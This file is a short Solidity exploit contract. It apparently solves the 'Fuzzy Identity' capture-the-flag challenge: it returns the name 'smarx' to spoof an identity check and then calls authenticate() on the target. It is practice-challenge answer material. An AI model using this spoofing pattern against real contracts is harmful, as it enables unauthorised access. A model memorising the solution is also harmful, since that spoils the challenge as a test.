// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IFuzzyIdentityChallenge {
    function authenticate() external;
}

contract Attacker {
    function hack(address _fuzzy) external {
        IFuzzyIdentityChallenge fuzzy = IFuzzyIdentityChallenge(_fuzzy);
        fuzzy.authenticate();
    }

    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }
}
